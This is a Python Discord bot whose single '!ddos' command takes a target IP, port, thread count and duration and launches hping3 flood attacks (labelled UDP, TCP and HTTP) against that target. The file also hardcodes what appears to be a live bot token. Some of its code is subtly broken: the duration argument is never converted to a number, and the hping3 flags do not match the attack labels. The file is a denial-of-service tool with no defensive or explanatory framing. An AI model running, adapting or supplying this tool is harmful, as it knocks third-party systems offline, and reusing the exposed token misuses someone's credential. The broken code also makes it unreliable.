import discord
from discord.ext import commands
import subprocess
import threading
import time

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
TOKEN = 'MTQwOTcwODY0MTU4MTQwNDI1MA.GAawtY.nizhEQtjMc2sjW5fq0nJhBb9uwZp9Cn-fASurM'

bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')

@bot.command()
async def ddos(ctx, attack_type, target_ip, target_port, num_threads, duration):
    print(f"Received ddos command: {attack_type} {target_ip} {target_port} {num_threads} {duration}")
    num_threads = int(num_threads)  # Convert num_threads to an integer
    if attack_type == 'udp':
        command = f'hping3 -2 -c {duration} -d 65507 -S -p {target_port} {target_ip}'
    elif attack_type == 'tcp':
        command = f'hping3 -S -c {duration} -d 65507 -p {target_port} {target_ip}'
    elif attack_type == 'http':
        command = f'hping3 -2 -c {duration} -d 65507 -p {target_port} --flood {target_ip}'
    else:
        await ctx.send('Invalid attack type. Use "udp", "tcp", or "http".')
        return

    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(num_threads):
            thread = threading.Thread(target=lambda: subprocess.call(command.split()))
            thread.start()
            thread.join()

    await ctx.send(f'Starting {attack_type.upper()} attack on {target_ip}:{target_port} with {num_threads} threads for {duration} seconds.')

bot.run(TOKEN)
